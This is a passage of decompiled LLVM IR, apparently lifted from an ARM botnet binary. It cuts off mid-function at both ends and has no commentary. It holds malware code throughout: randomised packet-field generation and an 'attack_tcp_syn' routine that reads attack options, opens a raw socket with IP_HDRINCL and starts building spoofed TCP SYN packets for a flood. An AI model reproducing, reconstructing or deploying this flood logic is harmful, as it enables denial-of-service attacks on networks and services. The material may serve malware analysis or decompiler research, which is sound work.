  %v4_a404 = mul i32 %v1_a3fc, 256
  %v4_a408 = mul i32 %v3_a3d8, 16777216
  %v5_a404 = or i32 %v4_a404, %v4_a408
  %v5_a408 = or i32 %v5_a404, %v5_a3f4
  %v7_a40c = lshr i32 %v0_a3dc, %v4_a400
  %v8_a40c = add i32 %v7_a40c, %v5_a408
  store i32 %v8_a40c, i32* %r2.global-to-local, align 4
  %v1_a41c = and i32 %v8_a40c, 65280
  store i32 %v1_a41c, i32* %r1.global-to-local, align 4
  store i32 %v6_9fdc, i32* %r0.global-to-local, align 4
  %v5_a428 = call i32 @llvm.bswap.i32(i32 %v8_a40c)
  store i32 %v5_a428, i32* %r3.global-to-local, align 4
  store i1 %v7_a2d4, i1* %cpsr_z.global-to-local, align 1
  %v1_a430 = load i32, i32* @r5, align 4
  %v2_a430 = add i32 %v1_a430, 16
  %v3_a430 = inttoptr i32 %v2_a430 to i32*
  store i32 %v5_a428, i32* %v3_a430, align 4
  br i1 %v2_a2d4, label %dec_label_pc_a438, label %dec_label_pc_a2dc

dec_label_pc_a438:                                ; preds = %dec_label_pc_a3d8, %dec_label_pc_a2d0
  %v0_a438 = call i32 @rand_next()
  store i32 %v0_a438, i32* %r0.global-to-local, align 4
  store i32 %v3_a04c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_a448, i1* %cpsr_z.global-to-local, align 1
  %v1_a44c = load i32, i32* @r5, align 4
  %v2_a44c = add i32 %v1_a44c, 12
  %v3_a44c = inttoptr i32 %v2_a44c to i32*
  store i32 %v0_a438, i32* %v3_a44c, align 4
  br i1 %v3_a448, label %dec_label_pc_a454, label %dec_label_pc_a438.dec_label_pc_a2f0_crit_edge

dec_label_pc_a438.dec_label_pc_a2f0_crit_edge:    ; preds = %dec_label_pc_a438
  %v1_a2f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a2f0

dec_label_pc_a454:                                ; preds = %dec_label_pc_a438, %dec_label_pc_a2dc
  %v0_a454 = call i32 @rand_next()
  %v1_a454 = trunc i32 %v0_a454 to i16
  store i32 %v0_a454, i32* %r0.global-to-local, align 4
  store i32 %v3_a050, i32* %r2.global-to-local, align 4
  %v1_a45c = load i32, i32* @r4, align 4
  %v9_a45c = icmp eq i32 %v3_a050, %v1_a45c
  store i1 %v9_a45c, i1* %cpsr_z.global-to-local, align 1
  %v3_a460 = load i32, i32* @r5, align 4
  %v4_a460 = add i32 %v3_a460, 4
  %v5_a460 = inttoptr i32 %v4_a460 to i16*
  store i16 %v1_a454, i16* %v5_a460, align 2
  br i1 %v9_a45c, label %dec_label_pc_a468, label %dec_label_pc_a454.dec_label_pc_a2fc_crit_edge

dec_label_pc_a454.dec_label_pc_a2fc_crit_edge:    ; preds = %dec_label_pc_a454
  %v1_a300.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a2fc

dec_label_pc_a468:                                ; preds = %dec_label_pc_a454, %dec_label_pc_a2f0
  %v0_a468 = call i32 @rand_next()
  %v1_a468 = trunc i32 %v0_a468 to i16
  store i32 %v0_a468, i32* %r0.global-to-local, align 4
  store i32 %v3_a054, i32* %r3.global-to-local, align 4
  %v1_a470 = load i32, i32* @r4, align 4
  %v9_a470 = icmp eq i32 %v3_a054, %v1_a470
  store i1 %v9_a470, i1* %cpsr_z.global-to-local, align 1
  %v3_a474 = load i32, i32* @r5, align 4
  %v4_a474 = add i32 %v3_a474, 20
  %v5_a474 = inttoptr i32 %v4_a474 to i16*
  store i16 %v1_a468, i16* %v5_a474, align 2
  br i1 %v9_a470, label %dec_label_pc_a47c, label %dec_label_pc_a468.dec_label_pc_a308_crit_edge

dec_label_pc_a468.dec_label_pc_a308_crit_edge:    ; preds = %dec_label_pc_a468
  %v1_a30c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a308

dec_label_pc_a47c:                                ; preds = %dec_label_pc_a468, %dec_label_pc_a2fc
  %v0_a47c = call i32 @rand_next()
  %v1_a47c = trunc i32 %v0_a47c to i16
  store i32 %v0_a47c, i32* %r0.global-to-local, align 4
  store i32 %v6_9edc, i32* %ip.global-to-local, align 4
  %v1_a484 = load i32, i32* @r4, align 4
  %v9_a484 = icmp eq i32 %v6_9edc, %v1_a484
  store i1 %v9_a484, i1* %cpsr_z.global-to-local, align 1
  %v3_a488 = load i32, i32* @r6, align 4
  %v4_a488 = add i32 %v3_a488, 2
  %v5_a488 = inttoptr i32 %v4_a488 to i16*
  store i16 %v1_a47c, i16* %v5_a488, align 2
  br i1 %v9_a484, label %dec_label_pc_a490, label %dec_label_pc_a47c.dec_label_pc_a314_crit_edge

dec_label_pc_a47c.dec_label_pc_a314_crit_edge:    ; preds = %dec_label_pc_a47c
  %v1_a318.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a314

dec_label_pc_a490:                                ; preds = %dec_label_pc_a47c, %dec_label_pc_a308
  %v0_a490 = call i32 @rand_next()
  %v1_a494 = load i32, i32* @r6, align 4
  %v2_a494 = add i32 %v1_a494, 4
  %v3_a494 = inttoptr i32 %v2_a494 to i32*
  store i32 %v0_a490, i32* %v3_a494, align 4
  store i32 %v6_9ef8, i32* %r0.global-to-local, align 4
  %v1_a49c = load i32, i32* @r4, align 4
  %v9_a49c = icmp eq i32 %v6_9ef8, %v1_a49c
  store i1 %v9_a49c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a49c, label %dec_label_pc_a4a4, label %dec_label_pc_a320

dec_label_pc_a4a4:                                ; preds = %dec_label_pc_a490, %dec_label_pc_a314
  %v0_a4a4 = call i32 @rand_next()
  store i32 %v0_a4a4, i32* %r0.global-to-local, align 4
  store i32 %v1_9fc8, i32* %r1.global-to-local, align 4
  store i1 %v2_a4ac, i1* %cpsr_z.global-to-local, align 1
  %v1_a4b0 = load i32, i32* @r6, align 4
  %v2_a4b0 = add i32 %v1_a4b0, 8
  %v3_a4b0 = inttoptr i32 %v2_a4b0 to i32*
  store i32 %v0_a4a4, i32* %v3_a4b0, align 4
  br i1 %v2_a4ac, label %dec_label_pc_a32c, label %dec_label_pc_a4b8

dec_label_pc_a4b8:                                ; preds = %dec_label_pc_a320, %dec_label_pc_a4a4
  %v0_a4b8 = load i32, i32* @r5, align 4
  %v1_a4b8 = add i32 %v0_a4b8, 40
  store i32 %v1_a4b8, i32* @r4, align 4
  store i32 %v1_a4b8, i32* %r0.global-to-local, align 4
  %v0_a4c0 = load i32, i32* @r8, align 4
  store i32 %v0_a4c0, i32* %r1.global-to-local, align 4
  %v2_a4c4 = call i32 @rand_alphastr(i32 %v1_a4b8, i32 %v0_a4c0)
  store i32 %v2_a4c4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a4cc = load i32, i32* @r4, align 4
  %v3_a4cc = load i32, i32* @r8, align 4
  %v4_a4cc = add i32 %v3_a4cc, %v2_a4cc
  %v5_a4cc = inttoptr i32 %v4_a4cc to i8*
  store i8 0, i8* %v5_a4cc, align 1
  br label %dec_label_pc_a32c

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a32c, %dec_label_pc_a298
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a4d8 = call i32 @__GI_time(i32* null)
  store i32 %v2_a4d8, i32* %r0.global-to-local, align 4
  store i32 %v2_9fec, i32* %r1.global-to-local, align 4
  %v9_a4e0 = icmp eq i32 %v2_9fec, %v2_a4d8
  store i1 %v9_a4e0, i1* %cpsr_z.global-to-local, align 1
  %v6_a4e4 = icmp slt i32 %v2_9fec, %v2_a4d8
  br i1 %v6_a4e4, label %dec_label_pc_a4e8, label %dec_label_pc_a298

dec_label_pc_a4e8:                                ; preds = %dec_label_pc_a4d4, %entry, %dec_label_pc_a4f4
  %v1_a4f0 = phi i32 [ %v3_a000, %entry ], [ %v1_a4f8, %dec_label_pc_a4f4 ], [ %v2_a4d8, %dec_label_pc_a4d4 ]
  store i32 %v18_9de0, i32* %sb.global-to-local, align 4
  store i32 %v24_9de0, i32* %fp.global-to-local, align 4
  store i32 %v27_9de0, i32* %lr.global-to-local, align 4
  ret i32 %v1_a4f0

dec_label_pc_a4f4:                                ; preds = %dec_label_pc_a010
  store i32 %v3_a000, i32* %r0.global-to-local, align 4
  %v1_a4f8 = call i32 @__GI___libc_close(i32 %v3_a000)
  store i32 %v1_a4f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a4e8

; uselistorder directives
  uselistorder i32 %v1_a4f8, { 1, 0 }
  uselistorder i32 %v0_a47c, { 1, 0 }
  uselistorder i32 %v0_a468, { 1, 0 }
  uselistorder i32 %v0_a454, { 1, 0 }
  uselistorder i32 %v5_a428, { 1, 0 }
  uselistorder i32 %v3_a3d8, { 3, 1, 2, 0 }
  uselistorder i32 %v1_a3a4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_a36c, { 1, 0 }
  uselistorder i32 %v4_a35c, { 1, 0 }
  uselistorder i32 %v0_a2ac, { 2, 1, 0 }
  uselistorder i1 %v2_a4ac, { 2, 3, 1, 0 }
  uselistorder i1 %v3_a448, { 1, 0, 2, 3 }
  uselistorder i1 %v7_a2d4, { 2, 1, 0 }
  uselistorder i32 %v1_a284, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a254, { 1, 0 }
  uselistorder i32 %v0_a1c0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a0e8, { 2, 0, 1 }
  uselistorder i32 %v1_a0e4, { 2, 0, 1 }
  uselistorder i32 %v1_a0d4, { 1, 0 }
  uselistorder i1 %v2_a058, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a04c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_a048, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a044, { 1, 0, 2 }
  uselistorder i1 %v7_a030, { 1, 0 }
  uselistorder i1 %v7_a004, { 1, 0 }
  uselistorder i32 %v3_a000, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_9fec, { 2, 1, 0 }
  uselistorder i32 %v6_9fdc, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_9fc8, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_9f40, { 0, 2, 1, 3 }
  uselistorder i32 %v6_9ef8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_9edc, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_9e8c, { 1, 2, 0 }
  uselistorder i32 %v1_9e68, { 2, 1, 0 }
  uselistorder i32 %v6_9e60, { 1, 0 }
  uselistorder i32 %v7_9e48, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_9e24, { 2, 1, 3, 0 }
  uselistorder i32 %v2_9e0c, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 47, 46, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 7, 5, 8, 6, 9, 10, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20, 21, 23, 22, 29, 24, 25, 26, 27, 28, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 6, 5, 4, 7, 3, 2, 1, 0, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_a4e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a4b8, { 1, 0 }
  uselistorder label %dec_label_pc_a32c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a298, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_a504 = load i32, i32* @r4, align 4
  %v24_a504 = load i32, i32* @fp, align 4
  %v27_a504 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_a530 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_a534 = load i32, i32* @r4, align 4
  store i32 %v0_a534, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a530, i32* @sl, align 4
  %v0_a544 = load i32, i32* @r5, align 4
  store i32 %v0_a544, i32* %r0.global-to-local, align 4
  %v5_a548 = inttoptr i32 %v0_a534 to i32*
  %v6_a548 = call i32 @attack_get_opt_int(i32 %v0_a544, i32* %v5_a548, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a560 = load i32, i32* @r4, align 4
  store i32 %v0_a560, i32* %r1.global-to-local, align 4
  %v0_a564 = load i32, i32* @r5, align 4
  store i32 %v0_a564, i32* %r0.global-to-local, align 4
  %v5_a568 = trunc i32 %v6_a548 to i8
  %v6_a56c = inttoptr i32 %v0_a560 to i32*
  %v7_a56c = call i32 @attack_get_opt_int(i32 %v0_a564, i32* %v6_a56c, i32 3, i32 65535, i32 %v6_a548)
  %v0_a570 = load i32, i32* @r4, align 4
  store i32 %v0_a570, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_a580 = load i32, i32* @r5, align 4
  store i32 %v0_a580, i32* %r0.global-to-local, align 4
  %v5_a584 = inttoptr i32 %v0_a570 to i32*
  %v6_a584 = call i32 @attack_get_opt_int(i32 %v0_a580, i32* %v5_a584, i32 4, i32 64, i32 %v7_a56c)
  %v1_a58c = urem i32 %v6_a584, 256
  %v0_a590 = load i32, i32* @r4, align 4
  store i32 %v0_a590, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a59c = load i32, i32* @r5, align 4
  store i32 %v0_a59c, i32* %r0.global-to-local, align 4
  %v6_a5a4 = inttoptr i32 %v0_a590 to i32*
  %v7_a5a4 = call i32 @attack_get_opt_int(i32 %v0_a59c, i32* %v6_a5a4, i32 5, i32 1, i32 %v1_a58c)
  %v1_a5b0 = urem i32 %v7_a5a4, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a5bc = load i32, i32* @r4, align 4
  store i32 %v0_a5bc, i32* %r1.global-to-local, align 4
  %v0_a5c0 = load i32, i32* @r5, align 4
  store i32 %v0_a5c0, i32* %r0.global-to-local, align 4
  %v5_a5c8 = inttoptr i32 %v0_a5bc to i32*
  %v6_a5c8 = call i32 @attack_get_opt_int(i32 %v0_a5c0, i32* %v5_a5c8, i32 6, i32 65535, i32 %v1_a5b0)
  %v0_a5d4 = load i32, i32* @r4, align 4
  store i32 %v0_a5d4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a5e0 = load i32, i32* @r5, align 4
  store i32 %v0_a5e0, i32* %r0.global-to-local, align 4
  %v5_a5e4 = inttoptr i32 %v0_a5d4 to i32*
  %v6_a5e4 = call i32 @attack_get_opt_int(i32 %v0_a5e0, i32* %v5_a5e4, i32 7, i32 65535, i32 %v6_a5c8)
  %v0_a5ec = load i32, i32* @r4, align 4
  store i32 %v0_a5ec, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v6_a5e4, i32* %fp.global-to-local, align 4
  %v0_a5fc = load i32, i32* @r5, align 4
  store i32 %v0_a5fc, i32* %r0.global-to-local, align 4
  %v5_a600 = inttoptr i32 %v0_a5ec to i32*
  %v6_a600 = call i32 @attack_get_opt_int(i32 %v0_a5fc, i32* %v5_a600, i32 16, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a604 = load i32, i32* @r4, align 4
  store i32 %v0_a604, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a614 = load i32, i32* @r5, align 4
  store i32 %v0_a614, i32* %r0.global-to-local, align 4
  %v5_a618 = inttoptr i32 %v0_a604 to i32*
  %v6_a618 = call i32 @attack_get_opt_int(i32 %v0_a614, i32* %v5_a618, i32 17, i32 0, i32 %v6_a600)
  %v0_a61c = load i32, i32* @r4, align 4
  store i32 %v0_a61c, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a62c = load i32, i32* @r5, align 4
  store i32 %v0_a62c, i32* %r0.global-to-local, align 4
  %v5_a630 = inttoptr i32 %v0_a61c to i32*
  %v6_a630 = call i32 @attack_get_opt_int(i32 %v0_a62c, i32* %v5_a630, i32 10, i32 0, i32 %v6_a618)
  %v0_a634 = load i32, i32* @r4, align 4
  store i32 %v0_a634, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a644 = load i32, i32* @r5, align 4
  store i32 %v0_a644, i32* %r0.global-to-local, align 4
  %v5_a648 = inttoptr i32 %v0_a634 to i32*
  %v6_a648 = call i32 @attack_get_opt_int(i32 %v0_a644, i32* %v5_a648, i32 11, i32 0, i32 %v6_a630)
  %v0_a64c = load i32, i32* @r4, align 4
  store i32 %v0_a64c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a65c = load i32, i32* @r5, align 4
  store i32 %v0_a65c, i32* %r0.global-to-local, align 4
  %v5_a660 = inttoptr i32 %v0_a64c to i32*
  %v6_a660 = call i32 @attack_get_opt_int(i32 %v0_a65c, i32* %v5_a660, i32 12, i32 0, i32 %v6_a648)
  %v0_a664 = load i32, i32* @r4, align 4
  store i32 %v0_a664, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a674 = load i32, i32* @r5, align 4
  store i32 %v0_a674, i32* %r0.global-to-local, align 4
  %v5_a678 = inttoptr i32 %v0_a664 to i32*
  %v6_a678 = call i32 @attack_get_opt_int(i32 %v0_a674, i32* %v5_a678, i32 13, i32 0, i32 %v6_a660)
  %v0_a67c = load i32, i32* @r4, align 4
  store i32 %v0_a67c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a68c = load i32, i32* @r5, align 4
  store i32 %v0_a68c, i32* %r0.global-to-local, align 4
  %v5_a690 = inttoptr i32 %v0_a67c to i32*
  %v6_a690 = call i32 @attack_get_opt_int(i32 %v0_a68c, i32* %v5_a690, i32 14, i32 1, i32 %v6_a678)
  %v0_a694 = load i32, i32* @r4, align 4
  store i32 %v0_a694, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a6a4 = load i32, i32* @r5, align 4
  store i32 %v0_a6a4, i32* %r0.global-to-local, align 4
  %v5_a6a8 = inttoptr i32 %v0_a694 to i32*
  %v6_a6a8 = call i32 @attack_get_opt_int(i32 %v0_a6a4, i32* %v5_a6a8, i32 15, i32 0, i32 %v6_a690)
  %v0_a6b0 = load i32, i32* @r4, align 4
  store i32 %v0_a6b0, i32* %r1.global-to-local, align 4
  %v2_a6b4 = load i32, i32* @global_var_23a4c.55, align 4
  store i32 %v2_a6b4, i32* %r3.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_a6c0 = load i32, i32* @r5, align 4
  store i32 %v0_a6c0, i32* %r0.global-to-local, align 4
  %v5_a6c4 = inttoptr i32 %v0_a6b0 to i32*
  %v6_a6c4 = call i32 @attack_get_opt_ip(i32 %v0_a6c0, i32* %v5_a6c4, i32 24, i32 %v2_a6b4, i32 %v6_a6a8)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a6d0 = call i32 @__GI_time(i32* null)
  %v1_a6d4 = load i32, i32* @r6, align 4
  %v2_a6d4 = add i32 %v1_a6d4, %v2_a6d0
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a6e8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a6e8, i32* %r0.global-to-local, align 4
  %v7_a6ec = icmp eq i32 %v3_a6e8, -1
  store i1 %v7_a6ec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a6e8, i32* @r8, align 4
  br i1 %v7_a6ec, label %dec_label_pc_abc0, label %dec_label_pc_a6f8

dec_label_pc_a6f8:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a700 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a700, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a714 = call i32 @__GI_setsockopt(i32 %v3_a6e8, i32 0, i32 3, i32 %v6_a700, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_a714, i32* %r0.global-to-local, align 4
  %v7_a718 = icmp eq i32 %v5_a714, -1
  store i1 %v7_a718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a718, label %dec_label_pc_abcc, label %dec_label_pc_a720

dec_label_pc_a720:                                ; preds = %dec_label_pc_a6f8
  %v3_a72c = mul i32 %v7_a56c, 65536
  store i32 %v3_a72c, i32* %r0.global-to-local, align 4
  %v0_a734 = load i32, i32* %fp.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_a630, i32* %r1.global-to-local, align 4
  %v3_a740 = urem i32 %v7_a56c, 65536
  store i32 %v3_a740, i32* %r2.global-to-local, align 4
  %v3_a744 = urem i32 %v6_a5c8, 65536
  store i32 %v3_a744, i32* %r3.global-to-local, align 4
  %v3_a748 = urem i32 %v0_a734, 65536
  %v0_a74c = load i32, i32* @sb, align 4
  %v2_a74c = icmp eq i32 %v0_a74c, 0
  store i1 %v2_a74c, i1* %cpsr_z.global-to-local, align 1
  %v1_a75c = urem i32 %v6_a630, 256
  store i32 %v1_a75c, i32* @fp, align 4
  br i1 %v2_a74c, label %dec_label_pc_a9b0.preheader, label %dec_label_pc_a764

dec_label_pc_a764:                                ; preds = %dec_label_pc_a720
  %trunc = trunc i32 %v7_a56c to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp60 = mul nuw nsw i32 %v3_a744, 256
  %v3_a790 = and i32 %tmp60, 65280
  %tmp61 = mul i32 %v0_a734, 256
  %v3_a794 = and i32 %tmp61, 65280
  %tmp62 = mul i32 %v6_a600, 256
  %v3_a798 = and i32 %tmp62, 65280
  %v1_a79c = urem i32 %v6_a630, 2
  %tmp63 = udiv i32 %v6_a5c8, 256
  %v4_a7a0 = urem i32 %tmp63, 256
  %v5_a7a0 = or i32 %v3_a790, %v4_a7a0
  %tmp64 = udiv i32 %v0_a734, 256
  %v4_a7a4 = urem i32 %tmp64, 256
  %v5_a7a4 = or i32 %v4_a7a4, %v3_a794
  store i32 %v5_a7a4, i32* @r5, align 4
  %tmp65 = udiv i32 %v6_a600, 256
  %v4_a7a8 = urem i32 %tmp65, 256
  %v5_a7a8 = or i32 %v4_a7a8, %v3_a798
  store i32 %v5_a7a8, i32* @lr, align 4
  %v1_a7bc = urem i32 %v6_a648, 2
  store i32 %v1_a7bc, i32* %r1.global-to-local, align 4
  %v1_a7c0 = urem i32 %v6_a660, 2
  store i32 %v1_a7c0, i32* %r2.global-to-local, align 4
  %v1_a7c4 = urem i32 %v6_a678, 2
  store i32 %v1_a7c4, i32* %r3.global-to-local, align 4
  %v1_a7c8 = urem i32 %v6_a690, 2
  store i32 %v1_a7c8, i32* @r6, align 4
  %v1_a7cc = urem i32 %v6_a6a8, 2
  store i32 %v1_a7cc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_a848 = trunc i32 %v6_a584 to i8
  %sext6 = mul nuw i32 %v5_a7a0, 65536
  %v4_a874 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_a7a4, 65536
  %v6_a8b0 = sdiv i32 %sext7, 65536
  %tmp = sub nsw i32 0, %v1_a7bc
  %v4_a8c8 = and i32 %tmp, 16
  %tmp66 = sub nsw i32 0, %v1_a7c0
  %v4_a8e0 = and i32 %tmp66, 8
  %tmp67 = sub nsw i32 0, %v1_a7c4
  %v4_a8f4 = and i32 %tmp67, 4
  %tmp68 = sub nsw i32 0, %v1_a7c8
  %v3_a908 = and i32 %tmp68, 2
  br label %dec_label_pc_a7f4

dec_label_pc_a7f4:                                ; preds = %.thread, %dec_label_pc_a764
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_a7fc = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_a7fc, i32* %r0.global-to-local, align 4
  %v3_a800 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a800, i32* %r2.global-to-local, align 4
  %v1_a804 = load i32, i32* @sl, align 4
  %v2_a804 = load i32, i32* @r4, align 4
  %v5_a804 = mul i32 %v2_a804, 4
  %v6_a804 = add i32 %v5_a804, %v1_a804
  %v7_a804 = inttoptr i32 %v6_a804 to i32*
  store i32 %v2_a7fc, i32* %v7_a804, align 4
  %v0_a808 = load i32, i32* %r2.global-to-local, align 4
  %v3_a808 = mul i32 %v0_a808, 32
  store i32 %v3_a808, i32* %r3.global-to-local, align 4
  %v0_a80c = load i32, i32* @sl, align 4
  %v4_a80c = mul i32 %v0_a808, 4
  %v5_a80c = add i32 %v0_a80c, %v4_a80c
  %v6_a80c = inttoptr i32 %v5_a80c to i32*
  %v7_a80c = load i32, i32* %v6_a80c, align 4
  store i32 %v7_a80c, i32* %r4.global-to-local, align 4
  %v5_a810 = mul i32 %v0_a808, 24
  store i32 %v5_a810, i32* %r3.global-to-local, align 4
  %v1_a814 = load i32, i32* @r7, align 4
  %v2_a814 = add i32 %v1_a814, %v5_a810
  store i32 %v2_a814, i32* %r0.global-to-local, align 4
  %v1_a818 = inttoptr i32 %v7_a80c to i8*
  %v2_a818 = load i8, i8* %v1_a818, align 1
  %tmp69 = urem i8 %v2_a818, 16
  %v1_a81c = zext i8 %tmp69 to i32
  %v1_a820 = or i32 %v1_a81c, 64
  store i32 %v1_a820, i32* %r3.global-to-local, align 4
  %v1_a824 = trunc i32 %v1_a820 to i8
  store i8 %v1_a824, i8* %v1_a818, align 1
  %v0_a828 = load i32, i32* %r4.global-to-local, align 4
  %v1_a828 = inttoptr i32 %v0_a828 to i8*
  %v2_a828 = load i8, i8* %v1_a828, align 1
  %v1_a82c = and i8 %v2_a828, -16
  %v1_a830 = or i8 %v1_a82c, 5
  store i32 %v1_a5b0, i32* %r1.global-to-local, align 4
  store i8 %v1_a830, i8* %v1_a828, align 1
  %v2_a840 = load i32, i32* %r4.global-to-local, align 4
  %v3_a840 = add i32 %v2_a840, 1
  %v4_a840 = inttoptr i32 %v3_a840 to i8*
  store i8 %v5_a568, i8* %v4_a840, align 1
  store i32 %v1_a58c, i32* %r3.global-to-local, align 4
  %v2_a848 = load i32, i32* %r4.global-to-local, align 4
  %v3_a848 = add i32 %v2_a848, 8
